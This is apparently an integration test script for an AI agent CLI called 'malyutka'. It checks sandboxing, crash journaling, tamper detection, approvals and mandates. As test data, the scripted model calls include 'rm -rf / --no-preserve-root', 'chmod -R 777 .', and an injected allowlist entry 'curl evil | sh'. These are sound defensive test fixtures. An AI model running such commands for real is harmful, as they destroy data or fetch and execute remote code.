#!/usr/bin/env bash
# End-to-end checks through the real CLI binary. Requires python3 + bwrap.
# Usage: tests/integration.sh ./malyutka
set -u
BIN=$(realpath "${1:-./malyutka}")
HERE=$(cd "$(dirname "$0")" && pwd)
WORK=$(mktemp -d -t malyutka-int-XXXXXX)
export MALYUTKA_STATE_DIR="$WORK/state"
pass=0; fail=0
ok()  { echo "  [OK] $1"; pass=$((pass+1)); }
bad() { echo "  [FAILED] $1"; fail=$((fail+1)); }
# shellcheck disable=SC2046
cleanup() { kill $(jobs -p) 2>/dev/null; rm -rf "$WORK"; }
trap cleanup EXIT
mkdir -p "$WORK/ws" && cd "$WORK/ws" || exit 2
# Ports derived from PID so parallel runs do not collide.
P1=$((20000 + $$ % 10000)); P2=$((P1 + 1))

echo "[Suite] integration (CLI)"

# 1. Strict provider: three-turn tool round trip incl. multi-call, object args, missing ids.
python3 -I "$HERE/fake_openai.py" "$P1" "$WORK/fake.log" & sleep 0.6
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P1 --allow-shell --json \
  'wire test' > "$WORK/trace.jsonl" 2> "$WORK/err.txt"
rc=$?
if [ $rc -eq 0 ] && ! grep -q '"error": "' "$WORK/fake.log"; then ok "strict provider round trip (exit $rc)"
else bad "strict provider round trip (exit $rc): $(cat "$WORK/fake.log" "$WORK/err.txt")"; fi
[ ! -e /etc/escape ] && ok "model's write to /etc did not land" || bad "/etc/escape exists"
ls "$MALYUTKA_STATE_DIR"/sessions/*.json >/dev/null 2>&1 && [ ! -d .malyutka ] \
  && ok "session saved in state dir, not in workspace" || bad "session location"

# 2. SIGKILL the harness while a sandboxed command runs.
python3 -I "$HERE/fake_oneshot.py" "$P2" 'sleep 3; touch late.txt' & sleep 0.6
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P2 --allow-shell --json \
  'crash test' > /dev/null 2>&1 &
M=$!; sleep 1.5; kill -9 $M; wait $M 2>/dev/null; sleep 0.3
# Match the real sandbox processes (bwrap, or the inner `sleep 3`), not the
# fake server, whose own argv also contains the command string.
{ pgrep -f '^[^ ]*bwrap .*late\.txt' || pgrep -x -f 'sleep 3'; } >/dev/null && bad "sandbox survived harness SIGKILL" \
  || ok "sandbox died with the harness"
sleep 3
[ ! -e late.txt ] && ok "killed command left no late write" || bad "late.txt written after harness died"

# 3. The journal reports the interrupted action as UNKNOWN_OUTCOME.
out=$("$BIN" journal 2>&1); rc=$?
if [ $rc -eq 5 ] && grep -q "sleep 3; touch late.txt" <<<"$out"; then ok "journal reports UNKNOWN_OUTCOME (exit 5)"
else bad "journal after crash (exit $rc): $out"; fi

# 4. The next run surfaces it, without re-executing it.
"$BIN" run --json 'next run' > "$WORK/trace2.jsonl" 2>/dev/null
grep -q '"journal.unknown_outcome"' "$WORK/trace2.jsonl" && ok "next run surfaces the unknown outcome" \
  || bad "next run did not surface unknown outcome"
[ ! -e late.txt ] && ok "interrupted action was not re-executed" || bad "action re-executed"

# 5. Operator acknowledgement clears it.
id=$(grep -oE '9M14-[0-9a-f]+-[0-9]{4}' <<<"$out" | head -1)
"$BIN" journal --ack:"$id" >/dev/null 2>&1 && "$BIN" journal >/dev/null 2>&1 \
  && ok "ack clears the pending action" || bad "ack did not clear $id"

# 5b. Reconcile is distinct from ack: run another interrupted action, reconcile it.
python3 -I "$HERE/fake_oneshot.py" "$((P2 + 1))" 'sleep 3' & sleep 0.6
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P2 + 1)) --allow-shell --json \
  'crash 2' > /dev/null 2>&1 &
M=$!; sleep 1.2; kill -9 $M; wait $M 2>/dev/null
id2=$("$BIN" journal 2>&1 | grep ' UNKNOWN_OUTCOME ' | grep -oE '9M14-[0-9a-f]+-[0-9]{4}' | head -1)
"$BIN" journal --reconcile:"$id2" --as:not-executed >/dev/null 2>&1 && "$BIN" journal >/dev/null 2>&1 \
  && ok "reconcile records an established outcome" || bad "reconcile of $id2"

# 5c. State dir inside the workspace is refused (the agent could edit its own journal).
MALYUTKA_STATE_DIR="$PWD/.state" "$BIN" run --allow-shell 'x' >/dev/null 2>&1; rc=$?
[ $rc -eq 5 ] && [ ! -e "$PWD/.state/journal.jsonl" ] && ok "state dir inside workspace -> refused (exit 5)" \
  || bad "state dir inside workspace exit $rc"
ln -s "$PWD" "$WORK/ws-alias"
MALYUTKA_STATE_DIR="$WORK/ws-alias/st" "$BIN" run --allow-shell 'x' >/dev/null 2>&1; rc=$?
[ $rc -eq 5 ] && ok "state dir reaching the workspace via symlink -> refused (exit 5)" || bad "symlink state dir exit $rc"

# 5d. A tampered journal is CORRUPT: `journal` exits 6 and runs are refused.
cp "$MALYUTKA_STATE_DIR/journal.jsonl" "$WORK/journal.bak"
python3 -I - "$MALYUTKA_STATE_DIR/journal.jsonl" <<'PY'
import sys
p = sys.argv[1]; lines = open(p).read().split("\n")
i = next(k for k, l in enumerate(lines) if '"rec":"started"' in l)
lines[i] = lines[i].replace('"rec":"started"', '"rec":"startex"')
open(p, "w").write("\n".join(lines))
PY
"$BIN" journal >/dev/null 2>&1; rc1=$?
"$BIN" run 'x' >/dev/null 2>&1; rc2=$?
[ $rc1 -eq 6 ] && [ $rc2 -eq 5 ] && ok "tampered journal -> CORRUPT (6), runs refused (5)" \
  || bad "tampered journal: journal exit $rc1, run exit $rc2"
cp "$WORK/journal.bak" "$MALYUTKA_STATE_DIR/journal.jsonl"

# 5e. Liveness: an action whose run is still alive cannot be reconciled; after SIGKILL it can.
python3 -I "$HERE/fake_oneshot.py" "$((P2 + 2))" 'sleep 4' & sleep 0.6
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P2 + 2)) --allow-shell --json \
  'live' > /dev/null 2>&1 &
M=$!; sleep 1.3
out=$("$BIN" journal 2>&1)
id3=$(grep 'in progress' <<<"$out" | grep -oE '9M14-[0-9a-f]+-[0-9]{4}' | head -1)
"$BIN" journal --reconcile:"$id3" --as:completed >/dev/null 2>&1; rc_alive=$?
kill -9 $M; wait $M 2>/dev/null
# 6 operators race to reconcile the now-dead action: exactly one may win.
racers=()
for k in 1 2 3 4 5 6; do
  ( "$BIN" journal --reconcile:"$id3" --as:failed >/dev/null 2>&1; echo $? > "$WORK/race.$k" ) &
  racers+=($!)
done
wait "${racers[@]}"   # only the racers: the fake servers run until cleanup
wins=$(cat "$WORK"/race.* 2>/dev/null | grep -c '^0$')
if [ -n "$id3" ] && [ $rc_alive -eq 2 ] && [ "$wins" = 1 ]; then
  ok "live action not reconcilable; after SIGKILL exactly 1 of 6 racing reconciles wins"
else bad "liveness/race: id='$id3' rc_alive=$rc_alive wins=$wins"; fi
"$BIN" journal >/dev/null 2>&1; rc=$?
[ $rc -eq 0 ] && ok "journal healthy after the race (exit 0)" || bad "journal after race exit $rc"

# 6. Fail closed: no usable sandbox -> refuse to run.
PATH=/nonexistent "$BIN" run --allow-shell 'x' >/dev/null 2>&1; rc=$?
[ $rc -eq 3 ] && ok "no bwrap -> refuses to run (exit 3)" || bad "no bwrap exit $rc"

# 7. Workspace guard: refuse $HOME as workspace.
(cd "$HOME" && "$BIN" run --allow-shell 'x' >/dev/null 2>&1); rc=$?
[ $rc -eq 3 ] && ok "\$HOME as workspace -> refused (exit 3)" || bad "\$HOME workspace exit $rc"

# 8. Commitment latch through the real CLI and a real sandboxed shell.
P3=$((P2 + 3)); P4=$((P2 + 4))   # P1..P2+2 are taken above
mdir="$WORK/mstate"
python3 -I "$HERE/fake_oneshot.py" "$P3" 'touch latched.txt' & sleep 0.6
MALYUTKA_STATE_DIR="$mdir" "$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P3 \
  --allow-shell --ask-from:B2 --mandates --json 'no mandate' > "$WORK/m1.jsonl" 2>/dev/null
if grep -q '"verdict":"DENY"' "$WORK/m1.jsonl" && [ ! -e latched.txt ]; then
  ok "ASK with no mandate -> denied, nothing ran"
else bad "ASK without mandate: $(grep policy.decision "$WORK/m1.jsonl")"; fi
mid=$(MALYUTKA_STATE_DIR="$mdir" "$BIN" mandate --grant --tools:shell --max-effect:B2 \
  --actions:1 --ttl:600 --goal:'integration' 2>/dev/null | awk '{print $1}')
python3 -I "$HERE/fake_oneshot.py" "$P4" 'touch latched.txt' & sleep 0.6
MALYUTKA_STATE_DIR="$mdir" "$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P4 \
  --allow-shell --ask-from:B2 --mandates --json 'with mandate' > "$WORK/m2.jsonl" 2>/dev/null
if [ -n "$mid" ] && grep -q "\"policy\":\"mandate:$mid\"" "$WORK/m2.jsonl" && [ -e latched.txt ]; then
  ok "latched mandate -> sandboxed shell ran, decision names $mid"
else bad "mandate run: mid='$mid' $(grep policy.decision "$WORK/m2.jsonl")"; fi
out=$(MALYUTKA_STATE_DIR="$mdir" "$BIN" mandate 2>&1)
echo "$out" | grep -q "$mid  EXHAUSTED" && ok "budget of 1 used -> EXHAUSTED" || bad "mandate list: $out"
sed -i 's/integration/tampered/' "$mdir/mandates.jsonl"
MALYUTKA_STATE_DIR="$mdir" "$BIN" mandate >/dev/null 2>&1; rc=$?
MALYUTKA_STATE_DIR="$mdir" "$BIN" run --ask-from:B2 --mandates 'x' >/dev/null 2>&1; rc2=$?
[ $rc -eq 7 ] && [ $rc2 -eq 7 ] && ok "tampered mandate log -> CORRUPT (7), runs refused (7)" \
  || bad "tampered mandate log exits $rc/$rc2"

# 9. M2: file tools end to end (scripted model, real binary, real journal).
mkdir -p "$WORK/m2" && cd "$WORK/m2" || exit 2
P3=$((P2 + 10))
cat > "$WORK/files.json" <<'JSON'
[[{"name":"write_file","args":{"path":"src/hello.txt","content":"hello world\n"}}],
 [{"name":"patch","args":{"path":"src/hello.txt","old":"world","new":"malyutka"}}],
 [{"name":"read_file","args":{"path":"src/hello.txt"}},
  {"name":"read_file","args":{"path":"../escape.txt"}}]]
JSON
python3 -I "$HERE/fake_script.py" "$P3" "$WORK/files.json" & sleep 0.6
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P3 --allow-files --json \
  'files' > "$WORK/files.trace" 2> "$WORK/files.err"; rc=$?
if [ $rc -eq 0 ] && [ "$(cat src/hello.txt)" = "hello malyutka" ]; then ok "file tools: write + patch landed in the workspace"
else bad "file tools (exit $rc): $(cat "$WORK/files.err")"; fi
grep -q 'ERROR: .*\.\.' "$WORK/files.err" || grep -q "'\.\.' is not allowed" "$WORK/files.err" \
  && ok "file tools: ../ escape reported to the model as an error" || bad "no traversal error: $(cat "$WORK/files.err")"
"$BIN" journal >/dev/null 2>&1 && ok "file tools: every call journaled, journal healthy" || bad "journal after file tools"

# 10. M2: approvals over the stdin control channel.
run_ask() { # name port script answer-or-"" extra-args... ; leaves trace in $WORK/$1.trace
  local name=$1 port=$2 script=$3 answer=$4; shift 4
  python3 -I "$HERE/fake_script.py" "$port" "$script" & sleep 0.5
  rm -f "$WORK/$name.fifo"; mkfifo "$WORK/$name.fifo"
  "$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$port --allow-shell --json \
    --approvals:stdin "$@" 'ask' < "$WORK/$name.fifo" > "$WORK/$name.trace" 2> "$WORK/$name.err" &
  local pid=$!
  exec 7> "$WORK/$name.fifo"
  if [ -n "$answer" ]; then
    local aid="" t=0
    while [ -z "$aid" ] && [ $t -lt 100 ]; do
      aid=$(grep -m1 '"approval.request"' "$WORK/$name.trace" 2>/dev/null | grep -oE '"action":"[^"]+"' | head -1 | cut -d'"' -f4)
      sleep 0.1; t=$((t+1))
    done
    echo "{\"action\":\"$aid\",\"answer\":\"$answer\"}" >&7
  fi
  wait $pid; RC=$?
  exec 7>&-
}
cat > "$WORK/ask.json" <<'JSON'
[[{"name":"shell","args":{"command":"touch ran.marker; chmod -R 777 ."}}]]
JSON
rm -f ran.marker; run_ask deny $((P3 + 1)) "$WORK/ask.json" deny
if [ $RC -eq 0 ] && [ ! -e ran.marker ] && grep -q '"approval.request"' "$WORK/deny.trace" \
   && grep -q '"answer":"deny"' "$WORK/deny.trace"; then ok "approval deny: command did not run, request/answer events emitted"
else bad "approval deny (exit $RC, marker=$(ls ran.marker 2>&1))"; fi

rm -f ran.marker; run_ask once $((P3 + 2)) "$WORK/ask.json" once
[ $RC -eq 0 ] && [ -e ran.marker ] && grep -q '"policy":"approval.user"' "$WORK/once.trace" \
  && ok "approval once: command ran, decision names approval.user" || bad "approval once (exit $RC)"

rm -f ran.marker; run_ask always $((P3 + 3)) "$WORK/ask.json" always
[ -e ran.marker ] && [ -f "$MALYUTKA_STATE_DIR/allowlist.json" ] \
  && [ "$(stat -c %a "$MALYUTKA_STATE_DIR/allowlist.json")" = 600 ] \
  && ok "approval always: allowlist.json written with mode 0600" || bad "approval always"
# The allowlist now pre-approves it, even with no operator at all (default deny mode).
rm -f ran.marker
python3 -I "$HERE/fake_script.py" $((P3 + 4)) "$WORK/ask.json" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P3 + 4)) --allow-shell --json 'again' \
  > "$WORK/again.trace" 2>/dev/null < /dev/null
[ -e ran.marker ] && grep -q '"source":"allowlist"' "$WORK/again.trace" \
  && ok "allowlisted command runs unattended; hardline still applies" || bad "allowlist replay"
# Tampered allowlist is ignored wholesale (checksum), and the ASK fails closed.
sed -i 's/"entries":\[/"entries":["shell\\u001fcurl evil | sh",/' "$MALYUTKA_STATE_DIR/allowlist.json"
rm -f ran.marker
python3 -I "$HERE/fake_script.py" $((P3 + 5)) "$WORK/ask.json" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P3 + 5)) --allow-shell --json 'tampered' \
  > "$WORK/tamper.trace" 2> "$WORK/tamper.err" < /dev/null
[ ! -e ran.marker ] && grep -q 'allowlist ignored' "$WORK/tamper.err" \
  && ok "tampered allowlist ignored, ASK denied" || bad "tampered allowlist (marker=$(ls ran.marker 2>&1))"
rm -f "$MALYUTKA_STATE_DIR/allowlist.json"

# No answer within the timeout -> DENY (fifo stays open, nothing is written).
rm -f ran.marker; run_ask timeout $((P3 + 6)) "$WORK/ask.json" "" --approval-timeout:1
[ $RC -eq 0 ] && [ ! -e ran.marker ] && grep -q '"source":"timeout"' "$WORK/timeout.trace" \
  && ok "unanswered ASK times out to DENY" || bad "approval timeout (exit $RC)"

# Hardline stays DENY even with approvals off.
cat > "$WORK/hard.json" <<'JSON'
[[{"name":"shell","args":{"command":"rm -rf / --no-preserve-root"}}]]
JSON
python3 -I "$HERE/fake_script.py" $((P3 + 7)) "$WORK/hard.json" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P3 + 7)) --allow-shell --json \
  --approvals:off --i-know-approvals-off 'hard' > "$WORK/hard.trace" 2>/dev/null < /dev/null
grep -q '"verdict":"DENY"' "$WORK/hard.trace" && ! grep -q '"approval.request"' "$WORK/hard.trace" \
  && ok "hardline command denied even with --approvals:off" || bad "hardline with approvals off"
"$BIN" run --approvals:off 'x' >/dev/null 2>&1; rc=$?
[ $rc -eq 2 ] && ok "--approvals:off requires --i-know-approvals-off" || bad "approvals off ack (exit $rc)"

# 11. M4-lite: sessions and resume through the real CLI.
mkdir -p "$WORK/m4" && cd "$WORK/m4" || exit 2
P4=$((P3 + 20))
cat > "$WORK/s1.json" <<'JSON'
[[{"name":"write_file","args":{"path":"keep.txt","content":"PERSISTED-BY-RUN-1"}}]]
JSON
python3 -I "$HERE/fake_script.py" "$P4" "$WORK/s1.json" "$WORK/s1.req" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P4 --allow-files --json \
  'first turn' > "$WORK/s1.trace" 2>/dev/null
sid=$("$BIN" sessions --json | python3 -c 'import json,sys; print(json.load(sys.stdin)[0]["run"])')
[ -n "$sid" ] && grep -q '"session.saved"' "$WORK/s1.trace" \
  && ok "session checkpointed during the run (session.saved events), listed by 'sessions'" || bad "session list/checkpoint"
rm -f keep.txt
jbefore=$(grep -c '"rec"' "$MALYUTKA_STATE_DIR/journal.jsonl")
python3 -I "$HERE/fake_script.py" $((P4 + 1)) <(echo '[]') "$WORK/s2.req" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P4 + 1)) --allow-files --json \
  --resume:"$sid" 'second turn' > "$WORK/s2.trace" 2> "$WORK/s2.err"; rc=$?
jafter=$(grep -c '"rec"' "$MALYUTKA_STATE_DIR/journal.jsonl")
if [ $rc -eq 0 ] && grep -q 'PERSISTED-BY-RUN-1\|wrote' "$WORK/s2.err" && grep -q 'first turn' "$WORK/s2.req"; then
  ok "resume: the model received the earlier transcript"
else bad "resume transcript (exit $rc): $(cat "$WORK/s2.err")"; fi
[ ! -e keep.txt ] && [ "$jbefore" = "$jafter" ] \
  && ok "resume re-executed nothing (file not recreated, journal unchanged)" || bad "resume replayed something (before=$jbefore after=$jafter)"
"$BIN" sessions --json | python3 -c 'import json,sys; d=json.load(sys.stdin); sys.exit(0 if d[0]["parent"]==sys.argv[1] else 1)' "$sid" \
  && ok "resumed session records its parent" || bad "parent link"
"$BIN" sessions --search:'first turn' | grep -q "$sid" && ok "sessions --search finds the transcript" || bad "sessions --search"
"$BIN" run --resume:does-not-exist x >/dev/null 2>&1; rc=$?
[ $rc -eq 2 ] && ok "resume of a missing session -> exit 2" || bad "missing resume exit $rc"

# Resume refuses while the session's lineage has an unresolved (crashed) action.
python3 -I "$HERE/fake_oneshot.py" "$((P4 + 2))" 'sleep 3' & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P4 + 2)) --allow-shell --json \
  'crash for resume' > /dev/null 2>&1 &
M=$!; sleep 1.3; kill -9 $M; wait $M 2>/dev/null; sleep 0.3
crashed=$("$BIN" journal 2>&1 | grep ' UNKNOWN_OUTCOME ' | grep -oE '9M14-[0-9a-f]+-[0-9]{4}' | tail -1)
crun=${crashed%-*}
"$BIN" run --provider:mock --resume:"$crun" 'continue' >/dev/null 2> "$WORK/s3.err"; rc=$?
[ $rc -eq 5 ] && grep -q 'unresolved' "$WORK/s3.err" && ok "resume refused while the lineage has an unresolved action (exit 5)" \
  || bad "resume with unknown outcome (exit $rc): $(cat "$WORK/s3.err")"
"$BIN" run --provider:mock --resume:"$crun" --resume-despite-unknown 'continue' >/dev/null 2>&1; rc=$?
[ $rc -eq 0 ] && ok "--resume-despite-unknown overrides, explicitly" || bad "override exit $rc"
"$BIN" journal --reconcile:"$crashed" --as:not-executed >/dev/null 2>&1 || true

# 12. Memory, SOUL.md, personality reach the system prompt; memory writes are private + journaled.
cat > "$WORK/mem.json" <<'JSON'
[[{"name":"memory","args":{"op":"add","text":"operator prefers tabs"}}]]
JSON
python3 -I "$HERE/fake_script.py" $((P4 + 3)) "$WORK/mem.json" "$WORK/m1.req" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P4 + 3)) --allow-memory --json \
  'remember' > /dev/null 2>&1
mf="$MALYUTKA_STATE_DIR/memory.md"
[ -f "$mf" ] && [ "$(stat -c %a "$mf")" = 600 ] && grep -q 'operator prefers tabs' "$mf" \
  && ok "memory tool wrote memory.md (0600) in the state dir" || bad "memory file"
[ ! -e "$PWD/memory.md" ] && ok "memory is not in the workspace" || bad "memory.md in workspace"
printf 'You are a calm lighthouse keeper.' > "$MALYUTKA_STATE_DIR/SOUL.md"; chmod 600 "$MALYUTKA_STATE_DIR/SOUL.md"
python3 -I "$HERE/fake_script.py" $((P4 + 4)) <(echo '[]') "$WORK/m2.req" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P4 + 4)) --allow-memory \
  --personality:terse-ops --json 'hello' > /dev/null 2>&1
python3 - "$WORK/m2.req" <<'PY' && ok "system prompt carries SOUL.md, personality and fenced memory" || bad "system prompt contents"
import json, sys
body = json.loads(open(sys.argv[1]).readline())
sys_msg = body["messages"][0]["content"]
assert body["messages"][0]["role"] == "system"
assert "lighthouse keeper" in sys_msg and "operations log voice" in sys_msg.lower()
assert "<memory>" in sys_msg and "operator prefers tabs" in sys_msg and "untrusted" in sys_msg
PY
"$BIN" run --provider:mock --personality:pirate x >/dev/null 2>&1; rc=$?
[ $rc -eq 2 ] && ok "unknown personality -> exit 2" || bad "personality exit $rc"
chmod 666 "$MALYUTKA_STATE_DIR/SOUL.md"
"$BIN" run --provider:mock x 2>&1 >/dev/null | grep -q 'SOUL ignored' && ok "group/world-writable SOUL.md is ignored with a warning" || bad "unsafe SOUL accepted"
rm -f "$MALYUTKA_STATE_DIR/SOUL.md"

echo "integration: $pass passed, $fail failed"
[ $fail -eq 0 ]
